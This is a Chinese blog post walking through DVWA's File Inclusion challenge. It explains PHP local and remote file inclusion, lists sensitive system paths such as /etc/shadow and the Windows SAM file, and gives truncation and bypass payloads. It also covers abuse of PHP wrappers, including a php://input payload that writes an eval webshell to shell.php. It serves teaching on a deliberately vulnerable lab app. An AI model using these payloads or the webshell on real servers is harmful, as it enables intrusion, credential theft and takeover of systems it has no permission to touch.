---
layout:     post               # 使用的布局（不需要改）
title:      DVWA之File Inclusion    # 标题 
subtitle:    DVWA  #副标题
date:       2020-08-02       # 时间
author:     yanmie             # 作者
header-img: img/.jpg    ##标签这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               
    - DVWA
  
--- 

## 文件包含函数

PHP中文件包含函数有以下四种：

    require()

    require_once()

    include()

    include_once()

include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。

而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。

## 漏洞产生原因

件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。

## 本地文件包含漏洞

```
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
```

测试结果：

通过目录遍历漏洞可以获取到系统中其他文件的内容：`../`

## 文件包含利用思路：

1. 包含一些敏感的配置文件，获取目标敏感信息
2. 配合图片马getshell
3. 包含临时文件getshell
4. 包含session文件getshell
5. 包含日志文件getshell(Apach、SSH等等)
6. 利用php伪协议进行攻击

#### Windows下常用敏感文件目录

```
c:\boot.ini // 查看系统版本

c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件

c:\windows\repair\sam // 存储Windows系统初次安装的密码

c:\ProgramFiles\mysql\my.ini // MySQL配置

c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码

c:\windows\php.ini // php 配置信息

```

#### Linux/Unix系统

```
/etc/passwd // 账户信息

/etc/shadow // 账户密码文件

/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件

/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置

/usr/local/app/php5/lib/php.ini // PHP相关配置

/etc/httpd/conf/httpd.conf // Apache配置文件

/etc/my.conf // mysql 配置文件

```
## session文件包含漏洞

利用条件： session的存储位置可以获取。

1.通过phpinfo的信息可以获取到session的存储位置。

通过phpinfo的信息，获取到session.save_path为`E:\phpstudy_pro\Extensions\tmp\tmp`

![aYgoI1.png](https://s1.ax1x.com/2020/08/02/aYgoI1.png)

2.通过猜测默认的session存放位置进行尝试。

如linux下默认存储在/var/lib/php/session目录下。

session中的内容可以被控制，传入恶意代码。

示例：

```
<?php

session_start();

$ctfs=$_GET['ctfs'];

$_SESSION["username"]=$ctfs;

?>
```

漏洞分析：

此php会将获取到的GET型ctfs变量的值存入到session中。

当访问`http://127.0.0.1:8081/session.php?ctfs=ctfs`后，会在`E:\phpstudy_pro\Extensions\tmp\tmp`目录下存储session的值。

session的文件名为sess_+sessionid，sessionid可以通过开发者模式获取。

![aYTSoD.png](https://s1.ax1x.com/2020/08/02/aYTSoD.png)

生成的文件`sess_rllmmlsc5oevjd347gfnodct4b`内容为`username|s:4:"ctfs";`

**漏洞利用**

通过上面的分析，可以知道ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。

也就是传入参数为马。	

攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。

## 有限制本地文件包含漏洞绕过

#### %00截断

条件：

	magic_quotes_gpc = Off 
	php版本<5.3.4

测试代码：

```
<?php
    $filename  = $_GET['filename'];
    include($filename . ".html");
?>
```

这里拼接了html后缀，但可以利用00截断，包含任意后缀的文件。

	?filename=../../../../../../../boot.ini%00

#### 路径长度截断

条件：

	windows OS，点号需要长于256；
	linux OS 长于4096

	
    Windows下目录最大长度为256字节，超出的部分会被丢弃；-
    Linux下目录最大长度为4096字节，超出的部分会被丢弃。

EXP:

	?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././


#### 点号截断

条件：

	windows OS，点号需要长于256

测试代码：

```
<?php
    $filename  = $_GET['filename'];
    include($filename . ".html");
?>
```

EXP:

	?filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................


## 远程文件包含漏洞

PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。

```
allow_url_fopen = On（是否允许打开远程文件）

allow_url_include = On（是否允许include/require远程文件）
```

#### 无限制远程文件包含漏洞

测试代码：

```
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
```

EXP:

	filename=http://192.168.91.133/FI/php.txt


#### 有限制远程文件包含漏洞绕过

测试代码：

	<?php include($_GET['filename'] . ".html"); ?>


代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀。

#### 问号绕过

	?filename=http://192.168.91.133/FI/php.txt?


#### #号绕过

	?filename=http://192.168.91.133/FI/php.txt%23

#### 其他绕过

	?filename=http://192.168.91.133/FI/php.txt%20

	?filename=http://192.168.91.133/FI/php.txt%3f

## PHP伪协议

PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。

#### php:// 输入输出流

PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。

    file:// — 访问本地文件系统
    http:// — 访问 HTTP(s) 网址
    ftp:// — 访问 FTP(s) URLs
    php:// — 访问各个输入/输出流（I/O streams）
    zlib:// — 压缩流
    data:// — 数据（RFC 2397）
    glob:// — 查找匹配的文件路径模式
    phar:// — PHP 归档
    ssh2:// — Secure Shell 2
    rar:// — RAR
    ogg:// — 音频流
    expect:// — 处理交互式的流


#### **php://filter（本地磁盘文件进行读取）**

元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。

用法：`?filename=php://filter/convert.base64-encode/resource=xxx.php` 一样。

	条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；

![aYqlNT.png](https://s1.ax1x.com/2020/08/02/aYqlNT.png)

[https://www.php.net/manual/zh/wrappers.php.php](https://www.php.net/manual/zh/wrappers.php.php)

#### **php://input**

可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。

用法：?file=php://input 数据利用POST传过去

**php://input （读取POST数据）**

碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；

测试代码：

```
<?php
    echo file_get_contents("php://input");
?>
```

读取post包中数据。

**php://input（写入木马）**

测试代码：

```
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
```

条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP < 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。

如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。

	<?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>');?>


如果不开启allow_url_include会报错：

**php://input（命令执行）**

测试代码：

```
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
```

条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP < 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；

![aYqbKs.png](https://s1.ax1x.com/2020/08/02/aYqbKs.png)

如果不开启allow_url_include会报错：

![aYqv5T.png](https://s1.ax1x.com/2020/08/02/aYqv5T.png)

#### file://伪协议 （读取文件内容）

通过file协议可以访问本地文件系统，读取到文件的内容

测试代码：

```
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
```

EXP

	?filename=file://c:/boot.ini

#### data://（读取文件）

和php伪协议的input类似，碰到file_get_contents()来用； <?php // 打印 “I love PHP” echo file_get_contents(‘data://text/plain;base64,SSBsb3ZlIFBIUAo=’); ?>

注意：<span style="color: rgb(121, 121, 121);"><?php phpinfo();,这类执行代码最后没有?></span>闭合;

如果php.ini里的allow_url_include=On（PHP < 5.3.0）,就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） 测试代码：

```
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
```

![aYL0Ln.png](https://s1.ax1x.com/2020/08/02/aYL0Ln.png)

#### phar://伪协议

这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。

用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php 注意： PHP > =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 

测试代码：

```
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
```

![aYLcJU.png](https://s1.ax1x.com/2020/08/02/aYLcJU.png)

#### zip://伪协议

zip伪协议和phar协议类似，但是用法不一样。

用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。

条件： PHP > =5.3.0，注意在windows下测试要5.3.0<PHP<5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。

测试代码：

```
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
```

![aYL5e1.png](https://s1.ax1x.com/2020/08/02/aYL5e1.png)


以上内容转载自[https://blog.csdn.net/Vansnc/article/details/82528395](https://blog.csdn.net/Vansnc/article/details/82528395)


## 开始解题

## Low

```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?> 
```


当输入不存在的文件时就会报错，爆出路径/

```
Warning: include(1): failed to open stream: No such file or directory in E:\phpstudy_pro\WWW\DVWA-master\DVWA-master\vulnerabilities\fi\index.php on line 36

Warning: include(): Failed opening '1' for inclusion (include_path='.;C:\php\pear;../../external/phpids/0.6/lib/') in E:\phpstudy_pro\WWW\DVWA-master\DVWA-master\vulnerabilities\fi\index.php on line 36
```

这里没有限制随便搞

	?page=file://c:/flag.txt

测试远程文件包含也可以

![aYjwsH.png](https://s1.ax1x.com/2020/08/02/aYjwsH.png)

## Medium

```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?> 
```

这里过滤了一些字符。

可双写绕过`htthttp://p://`、`..././`

## High

```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

* fnmatch — 用模式匹配文件名

```
 fnmatch ( string $pattern , string $string [, int $flags = 0 ] ) : bool

fnmatch() 检查传入的 string 是否匹配给出的 shell 统配符 pattern。 

 pattern

    shell 统配符。
string

    要检查的字符串。 此函数对于文件名尤其有用，但也可以用于普通的字符串。

    普通用户可能习惯于 shell 模式或者至少其中最简单的形式 '?' 和 '*' 通配符，因此使用 fnmatch() 来代替 preg_match() 来进行前端搜索表达式输入对于非程序员用户更加方便。
```

high级别的代码对包含的文件名进行了限制，必须为 file* 或者 include.php ，否则会提示Error：File not  found。

于是，我们可以利用 file 协议进行绕过。

## Impossible

```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

可以看到，impossible级别的代码使用了白名单过滤的方法，包含的文件名只能等于白名单中的文件，所以避免了文件包含漏洞的产生！